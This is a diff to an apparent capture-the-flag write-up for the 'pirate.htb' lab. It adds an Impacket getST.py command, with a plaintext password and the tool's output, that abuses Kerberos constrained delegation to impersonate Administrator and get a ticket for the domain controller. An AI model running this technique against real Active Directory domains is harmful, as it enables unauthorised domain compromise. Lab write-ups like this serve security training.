@@ -705,6 +705,23 @@ python3 addspn.py -t 'dc01$' --spn 'HTTP/WEB01.pirate.htb' -u 'pirate.htb\a.whit
 Then ill add the SPN for the DC
 
 ```python
+faketime -f +7h getST.py -spn "HTTP/WEB01.pirate.htb" -impersonate "Administrator" 'pirate.htb/a.white_adm:Password123!' -altservice "cifs/DC01.pirate.htb" -k
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB to cifs/DC01.pirate.htb@PIRATE.HTB
+[*] Saving ticket in Administrator@cifs_DC01.pirate.htb@PIRATE.HTB.ccache
+```
+
+Ill then just request a TGT for the Administrator
+
+# Domain Admin
+
+```python
 
 ```
 
